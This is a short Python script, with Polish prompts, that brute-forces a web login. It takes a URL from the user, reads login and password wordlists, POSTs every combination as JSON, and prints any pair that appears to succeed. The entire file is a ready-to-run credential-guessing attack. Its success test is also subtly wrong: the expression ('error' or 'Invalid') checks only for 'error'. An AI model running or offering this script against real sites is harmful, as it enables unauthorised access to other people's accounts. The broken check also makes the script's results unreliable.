import requests

url = str(input("Podaj url badanej strony: "))

with open("dictionaries/logins-short.txt", 'r') as file:
    logins = file.read().splitlines()
with open("dictionaries/passwords.txt", 'r') as file:
    passwords = file.read().splitlines()

for login in logins:
    for password in passwords:
        attempt = {"username": login, "password": password}
        res = requests.post(url, json=attempt)

        if res.status_code == 200 and ("error" or "Invalid") not in res.json():
            print("udało się zalogować za pomocą login:",login,"password:",password)
print("Nie ma udanych zalogowań, spróbuj skorzystać z innych słowników")